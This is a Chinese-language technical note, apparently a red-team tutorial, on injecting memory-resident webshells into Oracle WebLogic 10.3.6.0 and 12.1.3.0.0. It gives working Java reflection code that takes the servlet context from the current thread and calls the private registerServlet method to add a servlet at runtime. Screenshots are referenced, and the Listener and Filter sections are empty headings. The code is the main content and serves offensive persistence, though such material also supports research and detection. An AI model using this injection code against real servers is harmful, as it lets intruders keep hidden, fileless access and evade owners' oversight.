**目录**
- 获取上下文 WebAppServletContext
- 动态注册Servlet内存马  
- 动态注册Listener内存马
- 动态注册Filter内存马 

> 已测试10.3.6.0、12.1.3.0.0


### 获取上下文 WebAppServletContext

- WebAppServletContext

```java
Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
Method getCurrentWork = executeThread.getDeclaredMethod("getCurrentWork");
Object currentWork = getCurrentWork.invoke(Thread.currentThread());
WebAppServletContext webAppServletContext;
try { 
	// weblogic 12.1.3
	Field connectionHandler = currentWork.getClass().getDeclaredField("connectionHandler");
	connectionHandler.setAccessible(true);
	Object httpConnectionHandler = connectionHandler.get(currentWork);
	Field requestF = httpConnectionHandler.getClass().getDeclaredField("request");
	requestF.setAccessible(true);
	httpConnectionHandler = requestF.get(httpConnectionHandler);
	java.lang.reflect.Field contextF = httpConnectionHandler.getClass().getDeclaredField("context");
	contextF.setAccessible(true);
	webAppServletContext = (WebAppServletContext) contextF.get(httpConnectionHandler);
} catch (Exception e) {
	// weblogic 1036
	Field contextF = currentWork.getClass().getDeclaredField("context");
	contextF.setAccessible(true);
	webAppServletContext = (WebAppServletContext) contextF.get(currentWork);
}
```

### 动态注册Servlet内存马  

跟了一下从web.xml添加servet的流程，可以使用registerServlet方法注册Servlet，不过不同版本的weblogic对该方法有不同实现:

#### 10.3.6.0
![image](https://user-images.githubusercontent.com/55024146/143993515-f149070e-9ea0-487b-8dbf-fcb8f1682fcd.png)


成员方法
- weblogic.servlet.internal.WebAppServletContext#registerServlet()

![image](https://user-images.githubusercontent.com/55024146/143996030-4614d0d7-e77f-47e6-8540-ec40f41dc296.png)



反射调用
```java
Method registerServlet = webAppServletContext.getClass().getDeclaredMethod("registerServlet", String.class, String.class, String.class, Map.class);
registerServlet.setAccessible(true);
HashMap hashMap = new HashMap();
registerServlet.invoke(webAppServletContext, "TestServlet", "/abcd", servletClass.getName(), hashMap);
```
测试效果

![image](https://user-images.githubusercontent.com/55024146/143996228-773c6cf8-c801-4068-bcd9-8ce03e016de2.png)


#### 12.1.3.0.0

成员方法
- weblogic.servlet.internal.WebAppServletContext#registerServlet()
![image](https://user-images.githubusercontent.com/55024146/143996176-db4ea7f0-568b-492e-b20a-07ef8727f29c.png)


同样的，反射调用

```java
Method registerServlet = webAppServletContext.getClass().getDeclaredMethod("registerServlet", String.class, String.class, String.class);
registerServlet.setAccessible(true);
registerServlet.invoke(webAppServletContext, "TestServlet", "/121300", servletClass.getName());
response.getWriter().write("Servlet Injected Successfully!!!");
```

测试效果

![image](https://user-images.githubusercontent.com/55024146/143996258-5aef7689-b745-4273-95b8-e2f74776bb01.png)



### 动态注册Listener内存马  


### 动态注册Filter内存马  





